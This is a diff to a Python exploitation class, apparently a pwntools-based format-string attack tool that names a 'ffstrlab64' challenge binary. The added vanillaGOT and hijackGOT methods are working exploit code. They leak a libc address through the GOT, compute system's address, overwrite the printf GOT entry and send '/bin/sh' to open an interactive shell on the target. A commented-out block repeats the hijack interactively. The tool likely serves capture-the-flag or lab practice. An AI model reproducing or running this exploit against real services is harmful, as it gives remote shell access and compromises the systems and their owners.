@@ -58,6 +58,9 @@ class ffstr():
 		# Checking if PIE
 		self.pie =  None
 		
+		# Open Libc
+		self.libc = None
+		
 		# Dump binary
 		self.dump_name = None
 		
@@ -145,6 +148,10 @@ class ffstr():
 		# Check PIE
 		if "PIE" in args.keys():
 			self.pie = int(args.PIE,16)
+			
+		# Check LIBC
+		if "LIBC" in args.keys():
+			self.libc = args.LIBC
 			
 	def set_future_args(self,txt):
 		self.future_args.append(txt)
@@ -500,7 +507,7 @@ class ffstr():
 					while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 						data = self.asyncExchange(pl)
 					
-					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])#,end="\r")
+					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35],end="\r")
 					
 					
 					if data.find(self.delimiters[0]*2)>-1:
@@ -775,13 +782,13 @@ class ffstr():
 				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
-					leak = regex[0]
+					leak = hex(int(regex[0],16)-offset)
 					
 			# info gathering
 			info.append(leak)
 		
 		if info[0] == info[1]:
-			self.set_future_args("PIE="+info[0].decode())
+			self.set_future_args("PIE="+info[0])
 
 			
 	def dumpBinary(self):
@@ -935,8 +942,75 @@ class ffstr():
 			# Close connexion
 			if not all(self.blind_behavior):
 				self.close()
+	
+	def vanillaGOT(self):
+		# Exploit GOT overwriting having both chall binary and libc
+		
+		# Checking conditions
+		if self.elf is None:
+			print("No binary provided as argument : ELF = ")
+			return
+		if self.libc is None:
+			print("No libc binary provided : LIBC = ")
+			return
+		
+		# Accessing libc	
+		libc = ELF(self.libc)
 			
-	def loadELF(self):
+		# GOT overwriting
+		
+		# Closing the current connection
+		self.close()
+			
+		# Get location
+		i , offset = self.start
+			
+		if self.pie is None:
+			# Leak an hexadecimal value
+			leak = None
+			while leak is None:
+				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				regex = re.search(self.re_HexaPattern, data)
+				if regex:
+					leak = int(regex[0],16) - offset
+		else:
+			print("No pie")
+			leak = self.pie
+				
+		# Find puts (more stable than printf)
+		plt_got = self.elf.symbols["got.puts"]
+
+		# Read anywhere format string
+		pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+			
+		# Get libc puts leak
+		data = self.asyncExchange(pl)
+
+		# Extract leak
+		left = data.find(self.delimiters[0])+len(self.delimiters[0])
+		right= data.find(self.delimiters[1])
+		dump =data[left:right][:self.block_byte]
+		print("\n"+hex(plt_got)+","+dump[::-1].hex()+"\n")
+		
+		# Calculation libc base from puts leak
+		base =  int("0x"+dump[::-1].hex(),16) - libc.symbols["puts"]
+		
+		# overwrite printf
+		pf = base + libc.symbols["system"]
+		write={self.elf.symbols["got.printf"]:pf}
+		print(hex(plt_got),hex(pf))
+		# Write Instruction Pointer for returning to injected shellcode
+		pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
+		data = self.asyncExchange(pl)
+		self.asyncExchange(b"/bin/sh")
+		self.io.interactive()
+		# try /bin/sh
+		#self.asyncExchange(b"/bin/sh")
+					
+		# Check shell
+		self.checkshell()
+		
+	def showGOT(self):
 		# leak libc adress
 		# ldd --version ldd 
 		# objdump --dynamic-reloc ffstrlab64 
@@ -944,6 +1018,7 @@ class ffstr():
 		# if we have access to the elf
 		if "ELF" in args.keys():
 			dumped = args["ELF"]
+			
 		# unless scavenger way
 		else:
 			dumped = self.dump_name
@@ -959,7 +1034,7 @@ class ffstr():
 		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
 			
 		print(strings)
-		print(got)
+		print("\nPlease do your best to identify the Libc, and use LIBC=your_libc_here.so\n")
 		
 		k=0
 		for plt,rip in got:
@@ -978,7 +1053,7 @@ class ffstr():
 			# relocate 		
 			plt_got = int(plt[2:-1][::-1].hex(),16)
 			if plt_got < leak-offset:
-				plt_got += leak-offset+rip+6
+				plt_got += leak-offset+rip+6 # check why
 
 			
 			# Read anywhere format string
@@ -995,7 +1070,138 @@ class ffstr():
 			dump =data[left:right]
 			print(">> ",dump[::-1].hex())
 			
+	def hijackGOT(self):
+	
+		# Lazy mode, don't redo things
+		if self.libc is None:
+			return
+			
+		# Not clean, but does the work
+		print("LIBC", self.libc)
+		self.libc = ELF(self.libc)
+		
+		# if we have access to the elf
+		if "ELF" in args.keys():
+			dumped = args["ELF"]
+		# unless scavenger way
+		else:
+			dumped = self.dump_name
+			
+		# Dump opening
+		with open(self.dump_name,"rb") as fp:
+			data = fp.read()
+			
+		# Strings	
+		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
+			
+		# Got address 
+		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
+			
+		# puts
+		plt,rip = got[0]
+		
+		self.close()
+			
+		# Get location
+		i , offset = self.start
+			
+		if self.pie is None:
+			# Leak an hexadecimal value
+			leak = None
+			while leak is None:
+				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				regex = re.search(self.re_HexaPattern, data)
+				if regex:
+					leak = int(regex[0],16) - offset
+		else:
+			print("no pie")
+			leak = self.pie
+				
+		# relocate 		
+		plt_got = int(plt[2:-1][::-1].hex(),16)
+		if plt_got < leak:
+			plt_got += leak+rip+6 # check why
 
+		# Read anywhere format string
+		pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+			
+		# Get Data
+		data = b""
+		#while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
+		data += self.asyncExchange(pl)
+
+		left = data.find(self.delimiters[0])+len(self.delimiters[0])
+		right= data.find(self.delimiters[1])
+		dump =data[left:right][:self.block_byte]
+		print("\n"+hex(plt_got)+","+dump[::-1].hex()+"\n")
+		
+		base =  int("0x"+dump[::-1].hex(),16) - self.libc.symbols["puts"]
+		
+		# overwrite printf
+		pf = base + self.libc.symbols["system"]
+		#plt,rip = got[3]
+		#if plt_got < leak:
+		#	plt_got += leak+rip+6 # check why
+		write={plt_got+8*3:pf}
+		print(hex(plt_got),hex(pf))
+		# Write Instruction Pointer for returning to injected shellcode
+		pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
+		data = self.asyncExchange(pl)
+		self.asyncExchange(b"/bin/sh")
+		sleep(1)
+		#self.io.interactive()
+		# try /bin/sh
+		#self.asyncExchange(b"/bin/sh")
+					
+		# Check shell
+		self.checkshell()
+		"""
+		try:
+			dump = int("0x"+dump[::-1].hex(),16)
+				
+			# finding got leak
+			for elt in self.libc.symbols.keys():
+				if self.libc.symbols[elt] & 0xfff == dump & 0xfff:
+					print(elt,hex(dump))
+						
+			if input("Do we want to hijack here ? (y/n) ").lower().strip() == "y":
+				_from = input("function to be replaced > ").strip()
+				_to   = input("by > ").strip()
+				dump -= self.libc.symbols[_from]
+				print(hex(dump),hex(self.libc.symbols[_to]))
+				dump += self.libc.symbols[_to]
+				# write format string, bruteforce shellcode begining
+					
+				write={plt_got:dump}
+				print(hex(plt_got),hex(dump))
+				# Write Instruction Pointer for returning to injected shellcode
+				pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")+b";/bin/sh"
+				data = self.asyncExchange(pl)
+					
+				pl=self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+				#print(self.asyncExchange(pl))
+				#pl=self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+				# Get Data
+				data = b""
+				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
+					data += self.asyncExchange(pl)
+				left = data.find(self.delimiters[0])+len(self.delimiters[0])
+				right= data.find(self.delimiters[1])
+				_dump =data[left:right][:self.block_byte]
+				print("$$$",_dump[::-1].hex())
+					
+				# try
+				self.asyncExchange(b";/bin/sh")
+					
+				# Check shell
+				self.checkshell()
+					
+				print("failed")
+					
+		except Exception as ex:
+			print("** error ** "+str(ex))
+			pass
+		"""
 
 def help():
 	print(
@@ -1039,6 +1245,7 @@ if __name__ == "__main__":
 	exploit.PIE()
 	exploit.dumpBinary()
 	exploit.showSymbols()
-	exploit.loadELF()
-	
+	exploit.vanillaGOT()
+	exploit.showGOT()
+	exploit.hijackGOT()
 
